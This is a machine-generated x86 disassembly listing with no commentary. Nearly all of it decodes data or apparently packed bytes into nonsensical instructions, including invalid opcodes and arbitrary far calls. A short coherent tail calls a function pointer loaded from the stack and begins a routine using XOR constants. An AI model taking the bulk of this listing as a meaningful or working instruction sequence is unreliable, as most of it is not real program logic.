  4072a4:	and    BYTE PTR es:[ecx],bl
  4072a7:	bound  edi,QWORD PTR [edx-0x52]
  4072aa:	push   esp
  4072ab:	mov    ds:0x5d11b065,al
  4072b0:	xchg   esi,eax
  4072b1:	sbb    BYTE PTR [edi-0x7e],bl
  4072b4:	repz sahf 
  4072b6:	adc    al,0xb5
  4072b8:	pop    edi
  4072b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072ba:	dec    edx
  4072bb:	test   BYTE PTR [ecx-0x2],al
  4072be:	call   DWORD PTR [ebp+eax*4-0x2ccdd641]
  4072c5:	mov    bh,BYTE PTR [ebx+0x5c134f61]
  4072cb:	ret    0xe6b2
  4072ce:	call   0x4d1145d8
  4072d3:	retf   
  4072d4:	repz mov edi,0x32a90c7d
  4072da:	sbb    al,0x49
  4072dc:	aas    
  4072dd:	mov    al,ds:0xef6e654c
  4072e2:	lods   eax,DWORD PTR ds:[esi]
  4072e3:	xchg   ecx,eax
  4072e4:	jno    0x40727c
  4072e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072e7:	adc    BYTE PTR [eax-0x7fde76ea],0x9
  4072ee:	test   ah,bh
  4072f0:	dec    ebp
  4072f1:	xchg   ebx,eax
  4072f2:	fmul   st,st(5)
  4072f4:	mov    eax,DWORD PTR [esi+0x4e]
  4072f7:	jae    0x4072ce
  4072f9:	mov    ds,WORD PTR [ebx]
  4072fb:	mov    al,0x87
  4072fd:	cli    
  4072fe:	add    eax,DWORD PTR [ebp+edx*1-0x5ec3cfb6]
  407305:	pop    esi
  407306:	jmp    0x438d780
  40730b:	dec    ebx
  40730c:	fisub  WORD PTR [ecx]
  40730e:	in     al,0x2b
  407310:	pop    esi
  407311:	xor    DWORD PTR [ecx],edi
  407313:	push   ebx
  407314:	scas   eax,DWORD PTR es:[edi]
  407315:	adc    al,0x8b
  407317:	aas    
  407318:	xor    BYTE PTR [eax+ecx*1-0x39c3df83],bh
  40731f:	popf   
  407320:	sbb    dl,BYTE PTR [edi+0x62520f83]
  407326:	in     eax,0x3f
  407328:	pop    ebp
  407329:	repz imul ecx,edx,0x51
  40732d:	mov    ebp,ebx
  40732f:	loop   0x407327
  407331:	dec    edx
  407332:	jge    0x407318
  407334:	fisub  DWORD PTR [esi+0x71272a53]
  40733b:	enter  0x8b78,0x80
  40733f:	jle    0x407339
  407341:	jl     0x40730d
  407343:	fidivr WORD PTR [ebx]
  407345:	push   0xffffffad
  407347:	(bad)  
  407348:	(bad)  
  407349:	jg     0x4072cc
  40734b:	sbb    eax,DWORD PTR [ecx+eiz*8-0x46e55532]
  407352:	stos   BYTE PTR es:[edi],al
  407353:	cmp    al,0xb3
  407355:	lods   eax,DWORD PTR ds:[esi]
  407356:	add    dh,BYTE PTR [ecx+0x54b4884]
  40735c:	mov    WORD PTR [edi+ecx*8+0x23accd84],?
  407363:	jbe    0x4072ee
  407365:	ds scas al,BYTE PTR es:[edi]
  407367:	fimul  WORD PTR [ecx-0x57]
  40736a:	repz fnstsw WORD PTR [edx]
  40736d:	mov    edi,0xe070ddeb
  407372:	pop    ebx
  407373:	loopne 0x4073a7
  407375:	out    dx,eax
  407376:	jne    0x4073b7
  407378:	xor    BYTE PTR [ecx],dh
  40737a:	call   0xad74:0x1fc330b1
  407381:	or     al,0x78
  407383:	fisubr WORD PTR fs:[ecx]
  407386:	sub    DWORD PTR [ecx],ecx
  407388:	jmp    0x1feda295
  40738d:	mov    dh,BYTE PTR [edx+eiz*4+0x712931de]
  407394:	xor    al,0x33
  407396:	sahf   
  407397:	loop   0x40732b
  407399:	sbb    edi,DWORD PTR [ecx]
  40739b:	cmp    dh,BYTE PTR [ebx-0x4ba746f5]
  4073a1:	enter  0x5883,0xfe
  4073a5:	inc    esi
  4073a6:	jo     0x407344
  4073a8:	add    al,0xa3
  4073aa:	lods   al,BYTE PTR ds:[esi]
  4073ab:	jae    0x407420
  4073ad:	dec    eax
  4073ae:	pop    ebp
  4073af:	sbb    edx,DWORD PTR [ebx]
  4073b1:	dec    edi
  4073b2:	retf   0xd3c5
  4073b5:	or     DWORD PTR [edx+0x2d],0x3d9b0bbd
  4073bc:	arpl   si,si
  4073be:	inc    edx
  4073bf:	nop
  4073c0:	pop    ebx
  4073c1:	fist   DWORD PTR [ebx]
  4073c3:	xchg   ecx,eax
  4073c4:	xor    ebx,esi
  4073c6:	pop    esp
  4073c7:	out    0xb3,eax
  4073c9:	lods   al,BYTE PTR ds:[esi]
  4073ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4073cb:	(bad)  
  4073cc:	sub    eax,0x37ec19e
  4073d1:	sub    DWORD PTR [eax+0x60300adc],ebx
  4073d7:	shl    DWORD PTR [ecx],cl
  4073d9:	test   al,0x4c
  4073db:	sar    DWORD PTR [edi],0x99
  4073de:	mov    ebx,0x4a52497f
  4073e3:	cmp    DWORD PTR [ecx],0xffffffcb
  4073e6:	add    ch,BYTE PTR [eax+0x75]
  4073e9:	sbb    eax,0x9642e78a
  4073ee:	out    dx,eax
  4073ef:	or     al,0x9a
  4073f1:	(bad)  
  4073f2:	ret    
  4073f3:	mov    ds:0xdd7dbdc1,al
  4073f8:	test   BYTE PTR [ecx],ch
  4073fa:	cmc    
  4073fb:	mov    ebp,0x2c7dbe76
  407400:	test   BYTE PTR [edi+ecx*1-0x15],dh
  407404:	push   ss
  407405:	(bad)  
  407406:	fwait
  407407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407408:	jmp    0x40747d
  40740a:	mov    eax,DWORD PTR [ecx+0x40]
  40740d:	iret   
  40740e:	dec    eax
  40740f:	jbe    0x40745a
  407411:	sar    BYTE PTR [edx+0x1],1
  407414:	icebp  
  407415:	es push esp
  407417:	cmp    esi,ecx
  407419:	fcom   DWORD PTR [ecx-0x57]
  40741c:	and    DWORD PTR [ecx+0x5a3ed266],eax
  407422:	leave  
  407423:	jne    0x4073d1
  407425:	std    
  407426:	lea    ebp,[ebx]
  407428:	inc    esp
  407429:	jmp    0x407453
  40742b:	pop    ds
  40742c:	out    0xaf,al
  40742e:	hlt    
  40742f:	retf   
  407430:	addr16 mov ebp,0x9ab6c79d
  407436:	push   DWORD PTR [edi]
  407438:	sahf   
  407439:	jmp    0x4073d3
  40743b:	inc    esp
  40743c:	inc    eax
  40743d:	xor    DWORD PTR [ebp-0x361b08c9],ecx
  407443:	sub    edi,DWORD PTR [ebx-0x2d1d9145]
  407449:	xor    al,0x61
  40744b:	sbb    al,0x32
  40744d:	das    
  40744e:	imul   ebx,DWORD PTR [ebp-0x5a],0x5c81dd5b
  407455:	mov    ch,BYTE PTR [ebx+eiz*4]
  407458:	out    0xaf,eax
  40745a:	cmp    DWORD PTR [edx+0x7e],ebp
  40745d:	rcr    BYTE PTR [ecx],0x1b
  407460:	push   DWORD PTR [ecx+0x7421a23a]
  407466:	daa    
  407467:	sbb    ah,ah
  407469:	(bad)  
  40746b:	lods   eax,DWORD PTR ds:[esi]
  40746c:	call   0xc62e9d88
  407471:	cld    
  407472:	cmp    esi,DWORD PTR [edi+0x7ca65223]
  407478:	sbb    eax,0xe18e4b5a
  40747d:	or     DWORD PTR [esi-0x7853f9d3],0xe3f84c6c
  407487:	push   cs
  407488:	jno    0x40748b
  40748a:	sbb    esi,DWORD PTR [ecx-0x1a93644f]
  407490:	ret    0x1f6a
  407493:	cmp    bl,bh
  407495:	or     al,0xa6
  407497:	sbb    esp,DWORD PTR [edx-0x19]
  40749a:	jne    0x40745f
  40749c:	mov    DWORD PTR ds:0xd9b456fd,edx
  4074a2:	jae    0x407460
  4074a4:	aas    
  4074a5:	xchg   edx,eax
  4074a6:	pop    esp
  4074a7:	fcomp  DWORD PTR [eax+edi*4+0x663a72e0]
  4074ae:	(bad)  
  4074af:	(bad)  
  4074b0:	addr16 dec ebx
  4074b2:	cmp    al,BYTE PTR [esi-0x1f]
  4074b5:	cmp    edx,DWORD PTR ds:0xa784cbbb
  4074bb:	test   BYTE PTR [ecx],dh
  4074bd:	data16 mov bl,0xc4
  4074c0:	imul   esi,esp,0x4518604a
  4074c6:	xchg   ecx,eax
  4074c7:	pop    edx
  4074c8:	and    bh,BYTE PTR [eax-0x10c5eac4]
  4074ce:	push   eax
  4074cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074d0:	mov    eax,0x1cd4d39f
  4074d5:	lahf   
  4074d6:	jecxz  0x407464
  4074d8:	popa   
  4074d9:	icebp  
  4074da:	test   al,0xac
  4074dc:	xchg   ecx,eax
  4074dd:	mov    DWORD PTR [edi+0x2e],esp
  4074e0:	(bad)  
  4074e1:	jno    0x40749a
  4074e3:	ret    0xc50d
  4074e6:	or     eax,DWORD PTR [edi+0x5a0f8d63]
  4074ec:	mov    edi,0xd6c83499
  4074f1:	adc    bl,BYTE PTR [edi]
  4074f3:	popf   
  4074f4:	sub    DWORD PTR [ebp+0x2674ab6a],esi
  4074fa:	mov    ch,BYTE PTR [ecx]
  4074fc:	pop    edi
  4074fd:	pop    es
  4074fe:	(bad)  
  4074ff:	div    esp
  407501:	(bad)  
  407502:	xor    ebp,DWORD PTR [ebx]
  407504:	inc    ecx
  407505:	fld    QWORD PTR [eax+0x6d80cf6c]
  40750b:	mov    dl,0xae
  40750d:	daa    
  40750e:	sbb    al,0xd
  407510:	daa    
  407511:	mov    edi,0xc77ecf8f
  407516:	push   ss
  407517:	fsub   st(6),st
  407519:	mov    dh,0x91
  40751b:	jo     0x4074c3
  40751d:	(bad)  
  40751e:	jmp    0x407524
  407520:	pop    ds
  407521:	push   cs
  407522:	repnz cmc 
  407524:	test   DWORD PTR [edi-0x3e74bedf],edi
  40752a:	(bad)  
  40752b:	das    
  40752c:	jle    0x4074f4
  40752e:	mov    dh,0xa
  407530:	out    0xc,eax
  407532:	or     esp,DWORD PTR [ebx-0x50]
  407535:	jns    0x40756d
  407537:	jl     0x4075aa
  407539:	in     eax,0xb7
  40753b:	inc    ebx
  40753c:	and    BYTE PTR [ebp+0x2f],0x3b
  407540:	je     0x407599
  407542:	std    
  407543:	das    
  407544:	jae    0x40750f
  407546:	iret   
  407547:	ins    DWORD PTR es:[edi],dx
  407548:	shl    BYTE PTR [edi-0x10f2b89d],1
  40754e:	inc    edx
  40754f:	or     al,BYTE PTR fs:[ebx+0x3]
  407553:	test   ebx,0x5cb160aa
  407559:	or     cl,cl
  40755b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40755c:	jno    0x4074fa
  40755e:	retf   
  40755f:	call   0x186d:0xa070cb4
  407566:	cmc    
  407567:	cwde   
  407568:	fbstp  TBYTE PTR [ebx+0x61]
  40756b:	pop    ss
  40756c:	mov    al,ah
  40756e:	(bad)  
  40756f:	iret   
  407570:	xor    DWORD PTR [edi],ecx
  407572:	adc    BYTE PTR [ebx],0x5b
  407575:	sub    eax,0x877cd98e
  40757a:	sbb    al,0xa5
  40757c:	lahf   
  40757d:	adc    DWORD PTR [eax+0x52530d96],ebx
  407583:	popf   
  407584:	scas   al,BYTE PTR es:[edi]
  407585:	add    edi,DWORD PTR [esi-0x74]
  407588:	cs shl edi,0x6a
  40758c:	pushf  
  40758d:	jl     0x4075d5
  40758f:	pop    ebx
  407590:	jp     0x407525
  407592:	adc    eax,0x9e4d2105
  407597:	push   ecx
  407598:	lds    ebx,FWORD PTR [edx+esi*1+0x691d7f91]
  40759f:	cdq    
  4075a0:	out    0xd3,eax
  4075a2:	cmp    al,BYTE PTR [edi+0x2b9e5723]
  4075a8:	jns    0x407566
  4075aa:	mov    ?,WORD PTR ss:[ebx]
  4075ad:	xchg   esp,eax
  4075ae:	add    al,0xbe
  4075b0:	imul   esi,DWORD PTR [edx],0xffffffa8
  4075b3:	lock stos DWORD PTR es:[edi],eax
  4075b5:	sbb    BYTE PTR ds:0xd2a56b59,dl
  4075bb:	mov    bh,0x6c
  4075bd:	xchg   ebp,eax
  4075be:	mov    esp,0x1ba7def1
  4075c3:	mov    bl,0x6f
  4075c5:	cmp    eax,0x62c36ce1
  4075ca:	fmul   QWORD PTR [ebx-0xf6c8025]
  4075d0:	and    dl,bh
  4075d2:	and    eax,0x491aafac
  4075d7:	mov    ebx,0x9e89a529
  4075dc:	int3   
  4075dd:	lahf   
  4075de:	pmuludq mm7,mm3
  4075e1:	test   eax,0x4b3f0aa6
  4075e6:	push   0x63e0885
  4075eb:	dec    edi
  4075ec:	sbb    BYTE PTR [ebx-0x4417ee12],al
  4075f2:	hlt    
  4075f3:	push   0x40
  4075f5:	pop    es
  4075f6:	popf   
  4075f7:	xchg   DWORD PTR [ecx],edx
  4075f9:	into   
  4075fa:	jmp    DWORD PTR [edx]
  4075fc:	daa    
  4075fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075fe:	and    al,0x83
  407600:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407601:	cmp    al,BYTE PTR [ecx]
  407603:	add    BYTE PTR [edi-0x12],0x8b
  407607:	outs   dx,DWORD PTR ds:[esi]
  407608:	call   0xe4229738
  40760d:	imul   eax,DWORD PTR [ecx-0x233b0983],0x30
  407614:	gs xchg ebx,eax
  407616:	add    dl,BYTE PTR [esi]
  407618:	push   0xffffffcc
  40761a:	and    DWORD PTR [edx],esi
  40761c:	xlat   BYTE PTR ds:[ebx]
  40761d:	push   ecx
  40761e:	and    al,0xcf
  407620:	sar    BYTE PTR ds:[edx],1
  407623:	xor    edx,ecx
  407625:	sbb    al,0x21
  407627:	or     BYTE PTR [edi+0x2799b19d],0xd0
  40762e:	pop    eax
  40762f:	int    0xd1
  407631:	bound  ebp,QWORD PTR [edi-0x6a]
  407634:	in     eax,dx
  407635:	or     bl,0xcb
  407638:	adc    al,0x14
  40763a:	mov    ds:0x137c46a2,eax
  40763f:	sub    al,0x65
  407641:	pop    ebx
  407642:	add    ebp,esi
  407644:	arpl   WORD PTR [eax-0x56],dx
  407647:	cmp    dl,BYTE PTR [eax+0x2ac4b72b]
  40764d:	dec    ebp
  40764e:	ins    DWORD PTR es:[edi],dx
  40764f:	sub    dh,ch
  407651:	jnp    0x407615
  407653:	scas   eax,DWORD PTR es:[edi]
  407654:	push   0xdc360bc1
  407659:	push   ebx
  40765a:	hlt    
  40765b:	out    0xf6,al
  40765d:	loopne 0x407638
  40765f:	in     al,0x5a
  407661:	cld    
  407662:	jge    0x407600
  407664:	push   ecx
  407665:	sub    bl,BYTE PTR [esi+0x714a3032]
  40766b:	xchg   DWORD PTR [edi+0xa84c851],edi
  407671:	arpl   WORD PTR [edi-0x51],di
  407674:	clc    
  407675:	mov    esi,0x991c8fec
  40767a:	xchg   ecx,eax
  40767b:	jae    0x4076a0
  40767d:	gs pop eax
  40767f:	test   DWORD PTR [eax-0xc00c81a],ebp
  407685:	xchg   ebx,eax
  407686:	push   ds
  407687:	out    dx,eax
  407688:	(bad)  
  407689:	aaa    
  40768a:	dec    ecx
  40768b:	jcxz   0x407627
  40768e:	adc    cl,BYTE PTR gs:[ebp+0x38]
  407692:	dec    esi
  407693:	out    dx,al
  407694:	xchg   edx,eax
  407695:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407696:	lds    eax,FWORD PTR [edx]
  407698:	loopne 0x407661
  40769a:	leave  
  40769b:	jmp    0x4076b4
  40769d:	jp     0x40767b
  40769f:	jge    0x4076cf
  4076a1:	dec    esp
  4076a2:	dec    esi
  4076a3:	mov    dh,0x34
  4076a5:	add    DWORD PTR [esi],ebp
  4076a7:	stos   BYTE PTR es:[edi],al
  4076a8:	dec    ebp
  4076a9:	je     0x407692
  4076ab:	dec    ebp
  4076ac:	lds    ebx,FWORD PTR [ebx]
  4076ae:	inc    edi
  4076af:	lahf   
  4076b0:	push   edi
  4076b1:	leave  
  4076b2:	fistp  WORD PTR [edi+0x66]
  4076b5:	mov    ds:0x31fd235d,eax
  4076ba:	fsub   DWORD PTR [ebp+0x46f863fa]
  4076c0:	add    dh,al
  4076c2:	pop    edi
  4076c3:	les    eax,FWORD PTR [ebx]
  4076c5:	push   ecx
  4076c6:	sub    esi,DWORD PTR [eax-0x74bcb968]
  4076cc:	outs   dx,BYTE PTR ds:[esi]
  4076cd:	test   BYTE PTR [ebp+0x7a],0x6e
  4076d1:	outs   dx,DWORD PTR ds:[esi]
  4076d2:	(bad)  
  4076d3:	not    esi
  4076d5:	adc    BYTE PTR [edi-0x569b59c6],bh
  4076db:	xchg   ebx,eax
  4076dc:	aam    0x3d
  4076de:	xchg   esp,eax
  4076df:	hlt    
  4076e0:	fbstp  TBYTE PTR [ebx-0x34]
  4076e3:	clc    
  4076e4:	repnz dec eax
  4076e6:	dec    ecx
  4076e7:	jns    0x407747
  4076e9:	xor    bh,BYTE PTR [eax]
  4076eb:	rcr    DWORD PTR [eax+0x12],1
  4076ee:	or     al,0x79
  4076f0:	add    dl,BYTE PTR [edi+0x4e]
  4076f3:	out    0x6a,eax
  4076f5:	sub    edi,edi
  4076f7:	fmul   QWORD PTR [eax+0x65821e1e]
  4076fd:	push   ebp
  4076fe:	xor    BYTE PTR [eax+0x7c],0xd7
  407702:	addr16 ds imul edx,ebp,0x8db8cded
  40770a:	add    ebp,0xffffffd0
  40770d:	hlt    
  40770e:	dec    ebp
  40770f:	xchg   esp,eax
  407710:	mov    esi,eax
  407712:	cmp    edx,DWORD PTR [esi+0x7863852c]
  407718:	js     0x407725
  40771a:	push   cs
  40771b:	imul   esi,DWORD PTR [edx],0x60
  40771e:	push   ss
  40771f:	rcr    DWORD PTR [edi],1
  407721:	sub    dl,BYTE PTR [bx+0x6b2e]
  407726:	xor    bl,BYTE PTR [eax+0x140c64c8]
  40772c:	es je  0x4076d2
  40772f:	or     al,0x89
  407731:	xchg   esi,eax
  407732:	jns    0x4076fe
  407734:	mov    ds:0xfcccd4ec,eax
  407739:	ja     0x407752
  40773b:	int    0x1d
  40773d:	xchg   esi,eax
  40773e:	jb     0x4077a2
  407740:	mov    edx,0x72e816d0
  407745:	out    0x62,al
  407747:	pushf  
  407748:	fld    TBYTE PTR ds:0x3f80707e
  40774f:	dec    esp
  407750:	mov    gs,WORD PTR ds:0xcd967a37
  407756:	xor    eax,0xb8947ed0
  40775b:	or     ch,dl
  40775d:	bound  ecx,QWORD PTR [edx+ecx*4]
  407760:	mov    edx,0x4812c55
  407765:	inc    eax
  407766:	mov    esp,0x29027294
  40776b:	ds popf 
  40776d:	jns    0x407754
  40776f:	pop    es
  407770:	xor    bh,BYTE PTR [ecx-0x23f865b3]
  407776:	add    DWORD PTR [esi-0x37b39cd6],esi
  40777c:	or     eax,0x4ed5bfcb
  407781:	repnz and ecx,DWORD PTR [esi+0x35]
  407785:	push   ds
  407786:	test   edi,esi
  407788:	cdq    
  407789:	mov    edi,0x42cb0f73
  40778e:	test   DWORD PTR [eax],esp
  407790:	adc    ebp,DWORD PTR [ebp-0x3a01fc1c]
  407796:	sub    al,0xfa
  407798:	fild   WORD PTR [esi+0x15]
  40779b:	ror    al,cl
  40779d:	or     BYTE PTR [edx+0x2652b875],ch
  4077a3:	les    edi,FWORD PTR [edx+0x7c]
  4077a6:	xchg   esp,eax
  4077a7:	push   ds
  4077a8:	dec    ecx
  4077a9:	jge    0x4077ac
  4077ab:	adc    eax,DWORD PTR [ecx-0x2b51956e]
  4077b1:	fild   WORD PTR [ecx+0x40bee4d6]
  4077b7:	mov    DWORD PTR [edx+ecx*4-0x1e1ba49b],ebp
  4077be:	mov    bh,cl
  4077c0:	inc    ecx
  4077c1:	(bad)  
  4077c2:	lods   al,BYTE PTR ds:[esi]
  4077c3:	sbb    cl,BYTE PTR gs:0xf6b456d
  4077ca:	fsubr  st,st(2)
  4077cc:	add    ebx,DWORD PTR [eax+ebp*4-0x5db9f0c1]
  4077d3:	adc    esp,edx
  4077d5:	scas   al,BYTE PTR es:[edi]
  4077d6:	gs adc ecx,0x48
  4077da:	scas   eax,DWORD PTR es:[edi]
  4077db:	jle    0x407792
  4077dd:	adc    esi,0xffffff87
  4077e0:	cmp    al,0x40
  4077e2:	sbb    al,0xa4
  4077e4:	xchg   ebx,eax
  4077e5:	call   0x296d:0xe567486d
  4077ec:	pop    ss
  4077ed:	iret   
  4077ee:	cmp    BYTE PTR [esi],0x48
  4077f1:	out    0x2f,al
  4077f3:	xor    DWORD PTR [esi],ecx
  4077f5:	out    0x69,eax
  4077f7:	cdq    
  4077f8:	in     eax,dx
  4077f9:	xor    bl,BYTE PTR [ecx]
  4077fb:	mov    WORD PTR [esi+0x5b],cs
  4077fe:	fist   WORD PTR [ebx+0x69]
  407802:	(bad)  
  407803:	sar    DWORD PTR [ebx],cl
  407805:	out    0x13,eax
  407807:	ja     0x4077d5
  407809:	mov    cl,0x6b
  40780b:	fs sub dh,0xda
  40780f:	jmp    DWORD PTR [edx+0x2e]
  407812:	jbe    0x407840
  407814:	dec    ebp
  407815:	retf   
  407816:	je     0x4077eb
  407818:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407819:	mov    eax,ds:0x5e126b51
  40781e:	retf   
  40781f:	pusha  
  407820:	jle    0x407897
  407822:	call   0x6f71:0xc5a37bd4
  407829:	adc    dl,BYTE PTR [ecx+0x62]
  40782c:	xchg   ecx,eax
  40782d:	pop    ds
  40782e:	inc    edx
  40782f:	mov    eax,0x749b0f0
  407834:	pop    esp
  407835:	inc    esi
  407836:	cdq    
  407837:	mov    edi,cs
  407839:	call   0xd967:0x894985a3
  407840:	dec    edi
  407841:	mov    esp,0x4dd868d0
  407846:	test   ebp,ebp
  407848:	scas   al,BYTE PTR es:[edi]
  407849:	adc    eax,0x69e37e49
  40784e:	push   ebp
  40784f:	pop    ds
  407850:	inc    ebp
  407851:	mov    cl,0x7
  407853:	cmp    DWORD PTR [ecx+ecx*2],edx
  407856:	mov    esi,0x92059d67
  40785b:	pop    ss
  40785c:	pop    ebx
  40785d:	push   edx
  40785e:	sahf   
  40785f:	adc    al,0x55
  407861:	xchg   esi,eax
  407862:	pop    DWORD PTR [ecx+0x5ff24e23]
  407868:	sub    al,0x22
  40786a:	push   ebp
  40786b:	and    edi,ecx
  40786d:	mov    esi,ss
  40786f:	jno    0x4078b7
  407871:	mul    DWORD PTR [edx]
  407873:	and    BYTE PTR [eax+0x2c],ah
  407876:	cs ins DWORD PTR es:[edi],dx
  407878:	iret   
  407879:	mov    edx,0x3f782b4c
  40787e:	test   al,0x2
  407880:	nop
  407881:	jnp    0x40782d
  407883:	ja     0x4078bf
  407885:	ja     0x4078fd
  407887:	scas   eax,DWORD PTR es:[edi]
  407888:	shr    BYTE PTR [ecx-0x12],cl
  40788b:	scas   al,BYTE PTR es:[edi]
  40788c:	(bad)  
  40788d:	ficom  DWORD PTR [esi+0x69]
  407890:	pop    ebx
  407891:	nop
  407892:	jb     0x4078cf
  407894:	push   ebp
  407895:	cli    
  407896:	sbb    esi,ebx
  407898:	pop    ebx
  407899:	arpl   bx,si
  40789b:	fnsave [edi+0x47]
  40789e:	push   ebx
  40789f:	(bad)  
  4078a0:	(bad)  
  4078a1:	mov    ds:0xb5930638,eax
  4078a6:	xor    al,0x40
  4078a8:	dec    edx
  4078a9:	sahf   
  4078aa:	fs inc edi
  4078ac:	(bad)  
  4078ad:	pop    ds
  4078ae:	mov    WORD PTR [ebp-0x7644ec4d],ds
  4078b4:	cmp    ch,ah
  4078b6:	lds    ecx,FWORD PTR [esi-0x3b1781f5]
  4078bc:	push   esp
  4078bd:	ret    
  4078be:	push   esi
  4078bf:	popf   
  4078c0:	dec    ebp
  4078c1:	popf   
  4078c2:	sub    BYTE PTR [eax],dh
  4078c4:	mov    ebp,esp
  4078c6:	(bad)  
  4078c8:	xor    dh,BYTE PTR [ecx-0x7b4535b3]
  4078ce:	inc    esi
  4078cf:	mov    eax,0x96ca08d7
  4078d4:	or     dh,bl
  4078d6:	(bad)  
  4078d7:	pop    ebx
  4078d8:	shr    DWORD PTR [edi],1
  4078da:	xor    al,cl
  4078dc:	mov    ds:0x13d73fa4,al
  4078e1:	fadd   QWORD PTR [esi+0x8d35d48]
  4078e7:	xchg   esp,eax
  4078e8:	ins    DWORD PTR es:[edi],dx
  4078e9:	inc    edi
  4078ea:	pushf  
  4078eb:	mov    ds:0xc073039b,eax
  4078f0:	loop   0x4078af
  4078f2:	js     0x407932
  4078f4:	mov    eax,ds:0xb54daf5e
  4078f9:	(bad)  
  4078fa:	jo     0x40793a
  4078fc:	data16 aam 0x72
  4078ff:	iret   
  407900:	dec    esp
  407901:	and    dh,BYTE PTR [eax+0x58]
  407904:	ja     0x407922
  407906:	jl     0x40789c
  407908:	std    
  407909:	sbb    DWORD PTR [esi+0x7e],ecx
  40790c:	bound  edi,QWORD PTR [edx-0x29]
  40790f:	dec    edi
  407910:	loopne 0x40797f
  407912:	leave  
  407913:	or     esp,ebp
  407915:	sbb    ch,BYTE PTR [edi+eiz*8+0x7aa12dc2]
  40791c:	aaa    
  40791d:	aam    0x7e
  40791f:	inc    edx
  407920:	jno    0x40795b
  407922:	xchg   esi,eax
  407923:	out    0x9b,al
  407925:	sub    ecx,0x35757cd4
  40792b:	xor    BYTE PTR ds:0xb91dc1de,0xe3
  407932:	cmp    eax,0xb639b99
  407937:	cld    
  407938:	fnstcw WORD PTR [ecx-0x1e24c61a]
  40793e:	fisttp DWORD PTR [ebx+esi*4-0x7de79f1e]
  407945:	cmp    BYTE PTR [ebx],0x42
  407948:	popf   
  407949:	clc    
  40794a:	xor    edi,ebx
  40794c:	jae    0x4079b1
  40794e:	les    ebx,FWORD PTR [edx+ecx*1-0x14]
  407952:	mov    eax,0xca967314
  407957:	daa    
  407958:	pop    ebp
  407959:	adc    al,0x24
  40795b:	or     eax,0x10f2b175
  407960:	add    dh,BYTE PTR [ebx-0x67705b7e]
  407966:	div    DWORD PTR [edi-0x42]
  407969:	shl    DWORD PTR [ebx+0x5888660b],0x2c
  407970:	inc    ecx
  407971:	sbb    al,0xab
  407973:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407974:	dec    esi
  407975:	fsub   DWORD PTR [esp+eiz*8+0x64]
  407979:	nop
  40797a:	repz jb 0x407937
  40797d:	lock dec ebp
  40797f:	aas    
  407980:	xor    ecx,esp
  407982:	test   eax,0xf9f0b334
  407987:	mov    cl,0xb6
  407989:	push   ds
  40798a:	mov    cl,0x73
  40798c:	adc    ch,BYTE PTR [ebp+0x37]
  40798f:	mov    DWORD PTR [eax+0x35],esp
  407992:	ss and al,0x80
  407995:	out    dx,al
  407996:	retf   
  407997:	jbe    0x40792a
  407999:	xchg   esp,eax
  40799a:	mov    DWORD PTR [ebx+0x5a5ad4d1],edx
  4079a0:	dec    ebp
  4079a1:	popa   
  4079a2:	xlat   BYTE PTR ds:[ebx]
  4079a3:	xchg   ebp,eax
  4079a4:	call   0x46e0021
  4079a9:	inc    edi
  4079aa:	fld    TBYTE PTR [ebx-0x7ca4b5c3]
  4079b0:	call   0x7fea:0x7b82d78
  4079b7:	int3   
  4079b8:	mov    edx,0xd4ee569a
  4079bd:	adc    al,0xf7
  4079bf:	call   0xdf6f:0xea0d1126
  4079c6:	adc    DWORD PTR [edi],esi
  4079c8:	out    dx,al
  4079c9:	loope  0x407a0b
  4079cb:	mov    esp,0x8d375b13
  4079d0:	cmp    eax,0x180d3d6d
  4079d5:	mov    al,0x8
  4079d7:	out    0xed,al
  4079d9:	in     al,dx
  4079da:	mov    bl,0xd7
  4079dc:	push   0xfffffff4
  4079de:	sbb    al,0x6f
  4079e0:	pop    ds
  4079e1:	mov    DWORD PTR [ecx-0x7fe5babe],esp
  4079e7:	mov    ah,0xa9
  4079e9:	adc    al,0x16
  4079eb:	popa   
  4079ec:	popa   
  4079ed:	inc    edi
  4079ee:	imul   ecx,DWORD PTR [edx-0x43],0x42
  4079f2:	jae    0x407a48
  4079f4:	bound  eax,QWORD PTR [ebp-0x5cfe11c9]
  4079fa:	inc    ebx
  4079fb:	mov    ds:0xc77dae5d,eax
  407a00:	mov    eax,0x91991f01
  407a05:	add    eax,0xf812643a
  407a0a:	rol    DWORD PTR [edi+ebp*2],0xcf
  407a0e:	push   ecx
  407a0f:	pop    ebx
  407a10:	add    BYTE PTR [esi],bl
  407a12:	ds out 0xb7,eax
  407a15:	mov    edi,ss
  407a17:	mov    al,ds:0x7c15099b
  407a1c:	sbb    bh,BYTE PTR [ecx]
  407a1e:	mov    ?,WORD PTR [eax-0x70f608b7]
  407a24:	shr    DWORD PTR [ebx],0xd6
  407a27:	cli    
  407a28:	xor    al,0x8a
  407a2a:	jmp    0x43:0xa38c35ff
  407a31:	push   DWORD PTR ds:0x43a654
  407a37:	push   DWORD PTR [ebp-0x28]
  407a3a:	push   DWORD PTR [ebp-0x2c]
  407a3d:	mov    eax,DWORD PTR [ebp-0x14]
  407a40:	call   eax
  407a42:	mov    eax,DWORD PTR [ebp-0x30]
  407a45:	mov    ecx,DWORD PTR ds:0x43a350
  407a4b:	add    DWORD PTR [eax],ecx
  407a4d:	pop    edi
  407a4e:	pop    esi
  407a4f:	leave  
  407a50:	ret    
  407a51:	push   ebp
  407a52:	mov    ebp,esp
  407a54:	sub    esp,0x18
  407a57:	mov    DWORD PTR [ebp-0x10],0xf89f8585
  407a5e:	lea    eax,[ebp+0x14]
  407a61:	adc    DWORD PTR ds:0x43501c,ecx
  407a67:	mov    DWORD PTR [ebp-0x4],eax
  407a6a:	adc    ecx,edx
  407a6c:	push   esi
  407a6d:	xor    ecx,0x4b84
  407a73:	mov    esi,0xf89c8585
  407a78:	xor    DWORD PTR ds:0x438014,edx
  407a7e:	mov    DWORD PTR [ebp-0xc],esi
  407a81:	lea    eax,[ebp-0xc]
  407a84:	adc    edx,ecx
